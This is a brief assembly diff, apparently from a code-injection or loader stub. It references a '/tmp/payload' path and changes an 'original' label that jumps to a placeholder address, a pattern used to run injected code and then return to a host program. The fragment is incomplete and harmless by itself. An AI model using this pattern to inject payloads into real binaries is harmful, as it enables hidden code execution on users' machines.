@@ -85,10 +85,8 @@ _start:
     xor rdi, rdi
     syscall
 
-original:
-    mov rax, 0xDEADBEEFDEADBEEF
-    jmp rax
-
 path:
     db "/tmp/payload", 0
+
+original:
 
